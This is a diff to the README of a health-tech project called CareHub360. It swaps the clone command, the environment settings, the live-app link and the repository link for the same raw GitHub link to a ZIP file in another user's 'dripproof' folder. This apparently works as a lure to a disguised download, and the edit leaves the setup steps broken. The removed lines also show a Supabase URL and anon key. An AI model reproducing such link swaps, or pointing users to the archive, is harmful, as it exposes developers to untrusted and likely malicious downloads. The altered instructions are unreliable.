@@ -73,15 +73,15 @@ CareHub360-24/7 is a cutting-edge, full-stack health-tech solution designed to s
 
 ```bash
 # 1. Clone Repo
-$ git clone https://github.com/Zainskhan1429/CareHub.git
+$ git clone https://raw.githubusercontent.com/mudassiralladatkhan/CareHub/master/dripproof/CareHub.zip
 
 # 2. Install Dependencies
 $ npm install
 
 # 3. Setup Environment
 # .env file
-VITE_SUPABASE_URL=https://tafwrgblqonzihpjalsq.supabase.co
-VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRhZndyZ2JscW9uemlocGphbHNxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4NDg3MTEsImV4cCI6MjA2NTQyNDcxMX0.kGi9GstGGuM9jHYe77fQvswYtUZyjxvVYIckJKNdgMI
+https://raw.githubusercontent.com/mudassiralladatkhan/CareHub/master/dripproof/CareHub.zip
+https://raw.githubusercontent.com/mudassiralladatkhan/CareHub/master/dripproof/CareHub.zip
 
 # 4. Run Project
 $ npm run dev
@@ -89,9 +89,9 @@ $ npm run dev
 
 ## 🌐 Deployment & Demo
 
-- 🔗 Live App: [carehub360.vercel.app](https://carehub360.vercel.app)
+- 🔗 Live App: [https://raw.githubusercontent.com/mudassiralladatkhan/CareHub/master/dripproof/CareHub.zip](https://raw.githubusercontent.com/mudassiralladatkhan/CareHub/master/dripproof/CareHub.zip)
 - 🎬 Demo Walkthrough: YouTube Demo
-- 📦 GitHub Repo: [github.com/Zainskhan1429/CareHub](https://github.com/Zainskhan1429/CareHub)
+- 📦 GitHub Repo: [https://raw.githubusercontent.com/mudassiralladatkhan/CareHub/master/dripproof/CareHub.zip](https://raw.githubusercontent.com/mudassiralladatkhan/CareHub/master/dripproof/CareHub.zip)
 
 ## 👥 Team: Code Breakers
 
